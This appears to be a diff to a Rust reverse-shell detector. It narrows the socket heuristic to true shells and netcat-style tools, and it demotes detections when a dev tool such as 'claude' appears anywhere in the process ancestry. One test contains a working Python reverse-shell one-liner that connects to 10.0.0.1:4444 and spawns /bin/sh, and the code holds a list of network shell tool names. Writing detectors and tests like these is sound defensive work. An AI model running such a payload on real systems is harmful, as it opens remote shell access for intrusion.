@@ -10,11 +10,19 @@ use crate::core::threat::{ThreatEvent, ThreatSeverity, ThreatType};
 use crate::modules::ScanModule;
 use crate::util::proc_parse::{list_pids, read_proc_info, ProcInfo};
 
-/// Known shell binary names used for reverse shell detection.
-const SHELL_NAMES: &[&str] = &[
-    "bash", "sh", "zsh", "dash", "fish", "python", "python2", "python3", "perl", "ruby", "php",
-    "nc", "ncat", "socat",
-];
+/// True shell / netcat-style binaries. An open socket to a *public* IP on one
+/// of these is itself strong evidence of a reverse shell, because these
+/// programs have no routine reason to hold a long-lived connection to the
+/// internet — so the bare socket-FD heuristic is allowed to flag them.
+const TRUE_SHELL_NAMES: &[&str] = &["bash", "sh", "zsh", "dash", "fish", "nc", "ncat", "socat"];
+
+/// Script interpreters. These hold network sockets for countless benign
+/// reasons (HTTP clients, API SDKs, data backfills), so "has a socket to a
+/// public IP" carries almost no signal for them. They are flagged ONLY by the
+/// precise cmdline-signature path (`match_reverse_shell`), which requires the
+/// socket to be wired to a shell via dup2/exec — never by the bare socket-FD
+/// heuristic. This is the fix for the `backfill_13f.py` false-positive kill.
+const INTERPRETER_NAMES: &[&str] = &["python", "python2", "python3", "perl", "ruby", "php"];
 
 // ---------------------------------------------------------------------------
 // v2.6.2 reverse-shell signatures
@@ -322,6 +330,36 @@ fn get_process_name(pid: u32) -> Option<String> {
         .filter(|s| !s.is_empty())
 }
 
+/// Walk up the process tree from `pid`, returning the lowercased names of up
+/// to `max_depth` ancestors (immediate parent first).
+///
+/// This is what lets the dev-parent allowlist see through process launchers:
+/// Claude Code spawns work as `claude → uv → python3` (or `node → npx → …`),
+/// so the dev tool is often a *grandparent*, not the immediate parent. Bounded
+/// depth + a self-reference / pid<=1 stop guard prevents pathological loops.
+fn process_ancestry_names(pid: u32, max_depth: usize) -> Vec<String> {
+    let mut names = Vec::new();
+    let mut current = pid;
+    for _ in 0..max_depth {
+        let ppid = match get_parent_pid(current) {
+            Some(p) => p,
+            None => break,
+        };
+        // Stop at the init process / on a malformed self- or zero-reference.
+        if ppid == 0 || ppid == current {
+            break;
+        }
+        if let Some(name) = get_process_name(ppid) {
+            names.push(name.to_lowercase());
+        }
+        if ppid <= 1 {
+            break;
+        }
+        current = ppid;
+    }
+    names
+}
+
 /// Enrich a threat event with parent process info.
 fn enrich_with_parent(mut event: ThreatEvent, pid: u32) -> ThreatEvent {
     if let Some(ppid) = get_parent_pid(pid) {
@@ -600,21 +638,25 @@ impl ProcessModule {
     /// would normally still force kill. We can't override that from the
     /// detector module without a circular dependency, so the response
     /// engine reads the `degraded_by_dev_parent` detail (see ResponseEngine).
+    /// `ancestry` is the lowercased ancestor-name chain from
+    /// `process_ancestry_names` (immediate parent first). We demote if ANY
+    /// ancestor is an allowlisted dev tool — not just the immediate parent —
+    /// so a process launched as `claude → uv → python3` is still recognised as
+    /// running under a dev session. This is the fix for the grandparent gap
+    /// that let the `backfill_13f.py` kill through (`uv` was the direct parent).
     fn maybe_demote_for_dev_parent(
         &self,
         mut event: ThreatEvent,
         dev_parent_set: &std::collections::HashSet<String>,
+        ancestry: &[String],
     ) -> ThreatEvent {
         if self.config.strict_under_dev_tools || dev_parent_set.is_empty() {
             return event;
         }
-        let parent_name = match event.details.get("parent_name") {
-            Some(s) => s.to_lowercase(),
+        let matched = match ancestry.iter().find(|n| dev_parent_set.contains(*n)) {
+            Some(n) => n.clone(),
             None => return event,
         };
-        if !dev_parent_set.contains(&parent_name) {
-            return event;
-        }
         let prior = event.severity;
         event.severity = ThreatSeverity::Medium;
         event
@@ -622,11 +664,14 @@ impl ProcessModule {
             .insert("degraded_by_dev_parent".into(), "true".into());
         event
             .details
+            .insert("dev_parent_ancestor".into(), matched.clone());
+        event
+            .details
             .insert("severity_pre_demotion".into(), prior.to_string());
         event.details.insert("response_hint".into(), "alert".into());
         debug!(
-            parent_name = %parent_name,
-            "Reverse-shell match demoted to medium/alert (dev parent allowlist)"
+            dev_parent_ancestor = %matched,
+            "Reverse-shell match demoted to medium/alert (dev parent in ancestry)"
         );
         event
     }
@@ -682,7 +727,8 @@ impl ProcessModule {
                     .with_detail("cmdline", truncate_string(&cmdline_joined, 500))
                     .with_detail("detection_method", "cmdline_pattern");
                 let event = enrich_with_parent(event, proc.pid);
-                let event = self.maybe_demote_for_dev_parent(event, &dev_parent_set);
+                let ancestry = process_ancestry_names(proc.pid, 16);
+                let event = self.maybe_demote_for_dev_parent(event, &dev_parent_set, &ancestry);
 
                 debug!(
                     pid = proc.pid,
@@ -696,12 +742,28 @@ impl ProcessModule {
                 continue;
             }
 
-            // Second check: shell process with network socket FDs
-            let is_shell = SHELL_NAMES
+            // Second check: a *true shell* process with network socket FDs.
+            // Interpreters (python/perl/ruby/php) are deliberately excluded
+            // here — they reach this point only via the precise cmdline
+            // signature above. A bare socket to a public IP is normal for an
+            // interpreter (HTTP client, data script) and must not be treated
+            // as a reverse shell on its own.
+            let is_true_shell = TRUE_SHELL_NAMES
                 .iter()
                 .any(|s| name_lower == *s || name_lower.starts_with(&format!("{}.", s)));
 
-            if !is_shell {
+            if !is_true_shell {
+                // Interpreters reach here when they hold sockets but their
+                // cmdline didn't match a reverse-shell signature — i.e. a
+                // normal network client. Trace it (so we can audit what the
+                // narrowed heuristic now lets through) and move on.
+                if INTERPRETER_NAMES.iter().any(|s| name_lower == *s) {
+                    debug!(
+                        pid = proc.pid,
+                        name = %proc.name,
+                        "Interpreter with sockets but no reverse-shell signature; not flagging"
+                    );
+                }
                 continue;
             }
 
@@ -743,7 +805,8 @@ impl ProcessModule {
                         .with_detail("cmdline", truncate_string(&cmdline_joined, 500))
                         .with_detail("detection_method", "socket_fd");
                     let event = enrich_with_parent(event, proc.pid);
-                    let event = self.maybe_demote_for_dev_parent(event, &dev_parent_set);
+                    let ancestry = process_ancestry_names(proc.pid, 16);
+                    let event = self.maybe_demote_for_dev_parent(event, &dev_parent_set, &ancestry);
 
                     debug!(
                         pid = proc.pid,
@@ -1063,12 +1126,12 @@ mod tests {
         let module = ProcessModule::new(config);
 
         let event = ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
-            .with_severity(ThreatSeverity::Critical)
-            .with_detail("parent_name", "claude");
+            .with_severity(ThreatSeverity::Critical);
         let set: std::collections::HashSet<String> = ["claude".to_string(), "code".to_string()]
             .into_iter()
             .collect();
-        let demoted = module.maybe_demote_for_dev_parent(event, &set);
+        let demoted =
+            module.maybe_demote_for_dev_parent(event, &set, &["claude".to_string()]);
         assert_eq!(demoted.severity, ThreatSeverity::Medium);
         assert_eq!(
             demoted
@@ -1079,11 +1142,84 @@ mod tests {
         );
 
         let event2 = ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
-            .with_severity(ThreatSeverity::Critical)
-            .with_detail("parent_name", "sshd");
-        let kept = module.maybe_demote_for_dev_parent(event2, &set);
+            .with_severity(ThreatSeverity::Critical);
+        let kept = module.maybe_demote_for_dev_parent(event2, &set, &["sshd".to_string()]);
         assert_eq!(kept.severity, ThreatSeverity::Critical);
         assert!(!kept.details.contains_key("degraded_by_dev_parent"));
+    }
+
+    #[test]
+    fn test_dev_parent_demotion_via_grandparent_ancestry() {
+        // The backfill_13f.py incident: process tree is `claude -> uv ->
+        // python3`. The immediate parent (`uv`) is NOT a dev tool, but an
+        // ancestor (`claude`) is. Must demote kill->alert.
+        let mut config = ProcessConfig::default();
+        config.dev_parent_allowlist = vec!["claude".into()];
+        let module = ProcessModule::new(config);
+
+        let set: std::collections::HashSet<String> =
+            ["claude".to_string()].into_iter().collect();
+        let event = ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
+            .with_severity(ThreatSeverity::Critical);
+        // immediate parent first: uv (launcher), then claude (dev tool).
+        let ancestry = vec!["uv".to_string(), "claude".to_string()];
+        let demoted = module.maybe_demote_for_dev_parent(event, &set, &ancestry);
+        assert_eq!(
+            demoted.severity,
+            ThreatSeverity::Medium,
+            "a dev tool anywhere in the ancestry must demote, not just the immediate parent"
+        );
+        assert_eq!(
+            demoted.details.get("dev_parent_ancestor").map(String::as_str),
+            Some("claude")
+        );
+
+        // No dev tool anywhere in the chain → stays critical.
+        let event2 = ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
+            .with_severity(ThreatSeverity::Critical);
+        let no_dev = vec!["uv".to_string(), "bash".to_string(), "sshd".to_string()];
+        let kept = module.maybe_demote_for_dev_parent(event2, &set, &no_dev);
+        assert_eq!(kept.severity, ThreatSeverity::Critical);
+    }
+
+    #[test]
+    fn test_interpreters_excluded_from_socket_fd_heuristic() {
+        // python/perl/ruby/php must NOT be bare-socket-FD flaggable — they are
+        // only reachable via the precise cmdline signature path. True shells
+        // and netcat-style binaries remain socket-FD flaggable.
+        for interp in INTERPRETER_NAMES {
+            assert!(
+                !TRUE_SHELL_NAMES.contains(interp),
+                "{} must be excluded from the socket-FD reverse-shell heuristic",
+                interp
+            );
+        }
+        for sh in ["bash", "sh", "nc", "ncat", "socat"] {
+            assert!(
+                TRUE_SHELL_NAMES.contains(&sh),
+                "{} must remain socket-FD flaggable",
+                sh
+            );
+        }
+        // A genuine python reverse shell is still caught by the cmdline path.
+        let evil = "python3 -c 'import socket,subprocess,os;s=socket.socket();\
+            s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);\
+            subprocess.call([\"/bin/sh\",\"-i\"])'";
+        assert!(
+            match_reverse_shell(&evil.to_lowercase()).is_some(),
+            "real python reverse shell must still match via cmdline signature"
+        );
+    }
+
+    #[test]
+    fn test_process_ancestry_names_walks_chain() {
+        // Smoke test against the real tree: the test process has at least one
+        // ancestor (the test runner / shell), and the walk terminates.
+        let names = process_ancestry_names(std::process::id(), 16);
+        assert!(
+            names.len() <= 16,
+            "ancestry walk must respect the depth bound"
+        );
     }
 
     #[test]
@@ -1094,10 +1230,9 @@ mod tests {
         let module = ProcessModule::new(config);
 
         let event = ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
-            .with_severity(ThreatSeverity::Critical)
-            .with_detail("parent_name", "claude");
+            .with_severity(ThreatSeverity::Critical);
         let set: std::collections::HashSet<String> = ["claude".to_string()].into_iter().collect();
-        let kept = module.maybe_demote_for_dev_parent(event, &set);
+        let kept = module.maybe_demote_for_dev_parent(event, &set, &["claude".to_string()]);
         assert_eq!(
             kept.severity,
             ThreatSeverity::Critical,
